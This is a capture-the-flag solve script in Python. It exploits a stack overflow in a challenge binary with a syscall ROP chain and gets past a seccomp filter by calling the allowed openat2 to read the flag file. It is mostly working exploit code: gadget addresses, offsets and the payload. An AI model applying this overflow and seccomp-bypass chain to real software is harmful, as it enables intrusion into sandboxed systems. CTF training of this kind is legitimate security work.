"""
title: No Open Door
ctf: WolvCTF 2026
category: pwn
difficulty: 3
arch: amd64
linking: static
mitigation_gaps: [no-pie, no-canary, partial-relro, not-stripped]
vulnerabilities: [stack-overflow]
tags: [rop, syscall-rop, orw, seccomp, seccomp-bypass]
"""
from pwn import *
import re

# =====
# ANALYSIS
# =====
# Statically linked, no PIE. The vulnerable function has no canary even though
# the static libc routines do.
# The main buffer at rbp-0x40 is overflowed by an oversized read (0x200
# bytes), so saved RIP is controlled with plenty of room for a long ROP chain.
# The catch: a seccomp-bpf filter is installed (dump it with
# `seccomp-tools dump ./no-open-door`). Whitelisted syscalls are
# 0,1,3,8,9,12,15,231,437: read/write/close/lseek/mmap/brk/rt_sigreturn/
# exit_group are fine, open (2) and openat (257) are BLOCKED, but 437
# (openat2) is allowed and does exactly the same job.
# Plan: a pure syscall ROP that reads "/flag" into .bss, openat2's it, reads
# the content, writes it to stdout.

# =====
# CONSTANTS
# =====

# --- Gadgets (full addresses, no PIE) ---
# The syscall gadget has a built-in error check that is harmless here, since
# every syscall issued returns a small non-error value:
#   syscall
#   cmp rax, 0xfffffffffffff000
#   ja  <error>
#   ret
SYSCALL = 0x447849
POP_RDI = 0x4931AE
POP_RSI = 0x48FA7D
POP_RDX = 0x401766
POP_RAX = 0x47F468
POP_R10 = 0x401765

# --- Offsets and scratch ---
BUFF_TO_RBP_OFF = 0x40                       # buffer start to saved rbp
BUFF_TO_RET_OFF = BUFF_TO_RBP_OFF + 0x8      # buffer start to saved RIP
BSS_SCRATCH = 0x4C9688                       # free .bss for the path + open_how struct

# =====
# EXPLOIT
# =====

# Overflow up to the saved return address.
payload = b"A" * BUFF_TO_RET_OFF

# read(stdin, scratch, 9): stage the ROP data (path + struct) sent after the
# chain. 9 bytes covers "/flag\0" plus padding.
payload += p64(POP_RDI) + p64(0)                    # fd = stdin
payload += p64(POP_RSI) + p64(BSS_SCRATCH)          # dst
payload += p64(POP_RDX) + p64(9)                    # len
payload += p64(POP_RAX) + p64(0)                    # SYS_read
payload += p64(SYSCALL)

# openat2(AT_FDCWD, scratch, &open_how, sizeof(open_how)).
# openat2 takes a struct instead of a plain flags argument, three __u64 fields
# flags, mode and resolve. It sits in .bss right after the path and is left
# all-zero (flags = O_RDONLY, no special mode or resolve).
payload += p64(POP_RDI) + p64(0xffffffffffffff9c)   # AT_FDCWD (-100)
payload += p64(POP_RSI) + p64(BSS_SCRATCH)          # path "/flag\0"
payload += p64(POP_RDX) + p64(BSS_SCRATCH + 9)      # &open_how (after the path)
payload += p64(POP_R10) + p64(24)                   # sizeof(open_how)
payload += p64(POP_RAX) + p64(437)                  # SYS_openat2
payload += p64(SYSCALL)

# read(3, scratch, 0x100): slurp the flag into .bss.
# NOTE: openat2() returns the lowest free file descriptor. stdin/stdout/stderr
# hold 0/1/2 and nothing else is open, so the flag predictably lands on fd 3,
# which this read() uses.
payload += p64(POP_RDI) + p64(3)
payload += p64(POP_RSI) + p64(BSS_SCRATCH)
payload += p64(POP_RDX) + p64(0x100)
payload += p64(POP_RAX) + p64(0)                    # SYS_read
payload += p64(SYSCALL)

# write(stdout, scratch, 0x100): print the flag back.
payload += p64(POP_RDI) + p64(1)
payload += p64(POP_RSI) + p64(BSS_SCRATCH)
payload += p64(POP_RDX) + p64(0x100)
payload += p64(POP_RAX) + p64(1)                    # SYS_write
payload += p64(SYSCALL)

# The overflowing read wants 512 bytes before returning, so pad to that length
# to trigger the chain.
payload += b"A" * (512 - len(payload))

# Spawn the target and send the chain.
p = process("./no-open-door")
p.send(payload)

# Feed the staged ROP data: the path followed by a zeroed open_how struct.
p.send(b"/flag\0" + b"\0" * 24)

# --- Flag ---

# Extract the flag from the program output.
output = p.recvall(timeout=5)
match = re.search(rb"wctf\{[^}]*\}", output)
if match:
    print(f"Found flag: {match.group(0).decode()}")
else:
    print("Flag not found in the output:")
    print(output.decode(errors="replace"))
